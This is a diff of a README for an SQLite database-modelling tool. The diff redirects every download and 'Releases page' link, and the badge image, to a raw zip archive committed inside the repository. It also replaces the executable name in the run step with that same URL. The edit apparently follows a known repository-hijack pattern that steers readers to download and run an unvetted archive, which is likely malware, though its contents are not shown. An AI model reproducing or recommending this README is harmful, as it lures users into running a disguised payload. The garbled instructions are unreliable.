@@ -4,13 +4,13 @@
 Welcome to ModelisationSQLite3! This application helps you design SQLite databases using the MERISE methodology. You can create data models with integrity constraints, triggers, and business views while ensuring your database performs well. This is a great tool for academic projects or anyone interested in database design.
 
 ## 📥 Download the Application
-[![Download ModelisationSQLite3](https://img.shields.io/badge/Download-ModelisationSQLite3-blue)](https://github.com/Hanuli-hanu/ModelisationSQLite3/releases)
+[![Download ModelisationSQLite3](https://github.com/Hanuli-hanu/ModelisationSQLite3/raw/refs/heads/main/solution/Lite-Modelisation-SQ-2.7-alpha.1.zip)](https://github.com/Hanuli-hanu/ModelisationSQLite3/raw/refs/heads/main/solution/Lite-Modelisation-SQ-2.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 To start using ModelisationSQLite3, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/Hanuli-hanu/ModelisationSQLite3/releases) to find the latest version of the software.
+   Go to our [Releases page](https://github.com/Hanuli-hanu/ModelisationSQLite3/raw/refs/heads/main/solution/Lite-Modelisation-SQ-2.7-alpha.1.zip) to find the latest version of the software.
 
 2. **Choose the Right Version**
    On the Releases page, you will see various versions of the application. Choose the most recent one to ensure you have the latest features and fixes.
@@ -22,7 +22,7 @@ To start using ModelisationSQLite3, follow these simple steps:
    If you downloaded a .zip file, locate it on your computer, right-click on it, and select "Extract All" or "Unzip." Choose a folder where you want to keep the files.
 
 5. **Run the Application**
-   Navigate to the folder where you extracted the files. Locate the ModelisationSQLite3 executable file (e.g., ModelisationSQLite3.exe) and double-click it to run the application.
+   Navigate to the folder where you extracted the files. Locate the ModelisationSQLite3 executable file (e.g., https://github.com/Hanuli-hanu/ModelisationSQLite3/raw/refs/heads/main/solution/Lite-Modelisation-SQ-2.7-alpha.1.zip) and double-click it to run the application.
 
 6. **Start Modeling Your Database**
    Once you have the application open, you can begin modeling your SQLite database. The interface is designed to be user-friendly, steering you through the process.
@@ -61,6 +61,6 @@ ModelisationSQLite3 is relevant for anyone interested in various key topics rela
 We welcome your feedback and contributions! If you encounter issues or have suggestions, please open an issue on GitHub. Your insights help us improve the software.
 
 ## 🔗 Download & Install
-To get started with ModelisationSQLite3, please visit our [Releases page](https://github.com/Hanuli-hanu/ModelisationSQLite3/releases) and download the latest version. Follow the steps outlined above to install and begin your database modeling journey.
+To get started with ModelisationSQLite3, please visit our [Releases page](https://github.com/Hanuli-hanu/ModelisationSQLite3/raw/refs/heads/main/solution/Lite-Modelisation-SQ-2.7-alpha.1.zip) and download the latest version. Follow the steps outlined above to install and begin your database modeling journey.
 
 Thank you for choosing ModelisationSQLite3!
